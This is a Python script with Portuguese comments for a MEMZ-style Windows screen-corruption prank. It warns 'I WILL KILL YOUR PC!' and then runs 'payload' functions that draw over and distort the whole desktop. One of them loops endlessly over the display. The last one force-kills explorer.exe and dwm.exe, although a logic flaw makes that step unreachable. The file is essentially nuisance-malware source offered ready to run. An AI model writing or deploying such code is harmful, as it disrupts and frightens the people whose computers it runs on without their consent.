import win32gui
import win32con
import win32api
import random
import time
import math
import ctypes
import colorsys
import os
import subprocess

# Mostrar a lore antes de começar
ctypes.windll.user32.MessageBoxW(0, "I WILL KILL YOUR PC!", "VISUAL INSANITY", 0x10)

# Preparar tela
user32 = ctypes.windll.user32
user32.SetProcessDPIAware()
sw, sh = user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)

# =============== PAYLOAD 1 ===============

def payload1():
    x, y = 10, 10
    signX, signY = 1, 1
    incrementor = 10
    start = time.time()
    while time.time() - start < 10:
        hdc = win32gui.GetDC(0)

        x += incrementor * signX
        y += incrementor * signY

        brush = win32gui.CreateSolidBrush(win32api.RGB(
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        ))
        win32gui.SelectObject(hdc, brush)
        win32gui.Ellipse(hdc, x, y, x + 100, y + 100)

        # Ícone de erro spawn
        win32gui.DrawIcon(
            hdc,
            random.randint(0, sw),
            random.randint(0, sh),
            win32gui.LoadIcon(None, win32con.IDI_ERROR)
        )

        if y >= sh or y <= 0:
            signY *= -1
        if x >= sw or x <= 0:
            signX *= -1

        time.sleep(0.01)
        win32gui.DeleteObject(brush)
        win32gui.ReleaseDC(0, hdc)

# =============== PAYLOAD 2 ===============

def payload2():
    hdc = win32gui.GetDC(0)
    color = 0
    start = time.time()
    while time.time() - start < 10:
        hdc = win32gui.GetDC(0)
        rgb_color = colorsys.hsv_to_rgb(color, 1.0, 1.0)
        brush = win32gui.CreateSolidBrush(win32api.RGB(
            int(rgb_color[0]*255),
            int(rgb_color[1]*255),
            int(rgb_color[2]*255)
        ))
        win32gui.SelectObject(hdc, brush)

        win32gui.BitBlt(
            hdc,
            random.randint(-10, 10),
            random.randint(-10, 10),
            sw,
            sh,
            hdc,
            0,
            0,
            win32con.SRCCOPY,
        )
        win32gui.BitBlt(
            hdc,
            random.randint(-10, 10),
            random.randint(-10, 10),
            sw,
            sh,
            hdc,
            0,
            0,
            win32con.PATINVERT,
        )
        color += 0.05
        time.sleep(0.01)
        win32gui.ReleaseDC(0, hdc)

# =============== PAYLOAD 3 ===============

def payload3():
    desktop = win32gui.GetDesktopWindow()
    scaling_factor = 10
    angle = 0
    start = time.time()

    while time.time() - start < 10:
        hdc = win32gui.GetWindowDC(desktop)

        for i in range(0, int(sw + sh), scaling_factor):
            a = int(math.sin(angle) * 20 * scaling_factor)
            win32gui.BitBlt(hdc, 0, i, sw, scaling_factor, hdc, a, i, win32con.SRCCOPY)
            angle += math.pi / 40

        # Rapidão elipses
        for _ in range(10):
            x1 = random.randint(0, sw)
            y1 = random.randint(0, sh)
            x2 = x1 + random.randint(30, 150)
            y2 = y1 + random.randint(30, 150)
            brush = win32gui.CreateSolidBrush(win32api.RGB(
                random.randint(0, 255),
                random.randint(0, 255),
                random.randint(0, 255)
            ))
            win32gui.SelectObject(hdc, brush)
            win32gui.Ellipse(hdc, x1, y1, x2, y2)
            win32gui.DeleteObject(brush)

        win32gui.ReleaseDC(desktop, hdc)
        time.sleep(0.01)

# =============== PAYLOAD FINAL (renomeado para memz_exe) ===============

def memz_exe():
    delay = 0.1
    size = 100
    hdc = win32gui.GetDC(0)

    while True:
        hdc = win32gui.GetDC(0)
        # Tela encolhendo
        win32gui.StretchBlt(
            hdc,
            int(size / 2),
            int(size / 2),
            sw - size,
            sh - size,
            hdc,
            0,
            0,
            sw,
            sh,
            win32con.SRCCOPY,
        )

        # Spawn ícones de erro no mouse
        x, y = win32api.GetCursorPos()
        icon = win32gui.LoadIcon(None, win32con.IDI_ERROR)
        win32gui.DrawIcon(hdc, x, y, icon)

        time.sleep(delay)
        win32gui.ReleaseDC(0, hdc)

# =============== SUPER PAYLOAD FINAL (PolyBezier colorido + restart explorer) ===============

def final_explosion():
    hdc = win32gui.GetDC(0)
    w, h = sw, sh
    color = 0
    start = time.time()

    while time.time() - start < 10:
        hdc = win32gui.GetDC(0)

        color = (color + 0.02) % 1.0
        rgb_color = colorsys.hsv_to_rgb(color, 1.0, 1.0)
        p = [(random.randint(0, w), random.randint(0, h)) for _ in range(4)]

        hPen = win32gui.CreatePen(
            win32con.PS_SOLID,
            5,
            win32api.RGB(
                int(rgb_color[0] * 255), int(rgb_color[1] * 255), int(rgb_color[2] * 255)
            ),
        )

        win32gui.SelectObject(hdc, hPen)
        win32gui.PolyBezier(hdc, p)
        win32gui.DeleteObject(hPen)
        win32gui.ReleaseDC(0, hdc)
        time.sleep(0.01)

    # Após 10 segundos: restart explorer.exe e dwm.exe
    os.system("taskkill /f /im explorer.exe")
    os.system("taskkill /f /im dwm.exe")
    time.sleep(2)
    subprocess.Popen("explorer.exe")
    subprocess.Popen("dwm.exe")

# =============== EXECUÇÃO ===============

if __name__ == "__main__":
    payload1()
    payload2()
    payload3()
    memz_exe()
    final_explosion()